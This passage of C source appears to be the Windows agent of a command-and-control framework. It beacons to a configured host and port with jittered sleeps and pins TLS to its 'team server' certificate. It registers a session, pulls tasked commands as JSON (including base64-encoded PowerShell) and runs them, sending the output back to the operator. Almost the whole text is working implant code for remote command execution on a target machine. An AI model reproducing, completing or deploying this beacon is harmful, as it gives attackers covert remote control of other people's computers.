
            const char *obj_start = p;
            int depth = 0;
            const char *obj_end = p;
            while (*obj_end) {
                if (*obj_end == '{') depth++;
                else if (*obj_end == '}') { depth--; if (depth == 0) { obj_end++; break; } }
                obj_end++;
            }
            size_t obj_len = (size_t)(obj_end - obj_start);
            /* Both buffers are sized from the object instead of from a fixed
             * ceiling: a base64-encoded PowerShell command runs past a kilobyte
             * on its own, and a command truncated here is a different command
             * on the target, not a command that failed. */
            char *obj = (char *)malloc(obj_len + 1);
            char *cmd = NULL;
            char cmd_id[64] = {0};
            if (!obj) return -1;
            memcpy(obj, obj_start, obj_len);
            obj[obj_len] = '\0';

            cmd = (char *)malloc(obj_len + 1);
            if (cmd) {
                json_get_string(obj, "command_id", cmd_id, sizeof(cmd_id));
                json_get_string(obj, "command", cmd, obj_len + 1);
            }
            free(obj);

            int ran = cmd && cmd[0] ? send_output(s, cmd, cmd_id) : 0;
            free(cmd);
            if (ran != 0) return -1;
            p = obj_end;
        }
        return 0;
    }

    return 0;
}

/* ── main ── */

int main(void) {
    WSADATA wsa;
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    get_hostname();
    get_username();

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    g_tls_on = AGENT_TLS;

    while (1) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)AGENT_PORT);
        inet_pton(AF_INET, AGENT_HOST, &addr.sin_addr);

        if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
            close_conn(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        if (g_tls_on) {
            int rc = tls_handshake(s);
            if (rc != 0) {
                close_conn(s);
                if (rc == -2) {
                    /* Something else answers on that port with a certificate
                     * this payload was not built against: a team server that
                     * regenerated its certificate, or a host that is not ours.
                     * Every retry would say the same thing, so say it once and
                     * stop rather than keep knocking. */
                    g_fatal = 1;
                    break;
                }
                jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
                continue;
            }
        }

        g_session_id[0] = '\0';
        g_beacon[0] = '\0';
        if (handle_register(s) != 0) {
            close_conn(s);
            if (g_fatal) break;
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        char line[RECV_BUF_SIZE];
        if (agent_readline(s, line, sizeof(line)) < 0) {
            close_conn(s);
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }
        if (handle_server_msg(s, line) != 0) {
            close_conn(s);
            if (g_fatal) break;
            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
            continue;
        }

        while (1) {
            char checkin[SEND_BUF_SIZE];
            snprintf(checkin, sizeof(checkin),
                     "{\"type\":\"checkin\",\"session_id\":\"%s\",\"beacon\":\"%s\"}",
                     g_session_id, g_beacon);
            if (agent_send(s, checkin) != 0) break;

            if (agent_readline(s, line, sizeof(line)) < 0) break;
            if (handle_server_msg(s, line) != 0) break;

            jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
        }

        close_conn(s);
        if (g_fatal) break;
        jittered_sleep(AGENT_SLEEP, AGENT_JITTER);
    }

    WSACleanup();
    /* 3 is what the Python agent exits with for the same failure, so whichever
     * payload an operator drops, the exit code means the same thing. */
    return g_fatal ? 3 : 0;
}
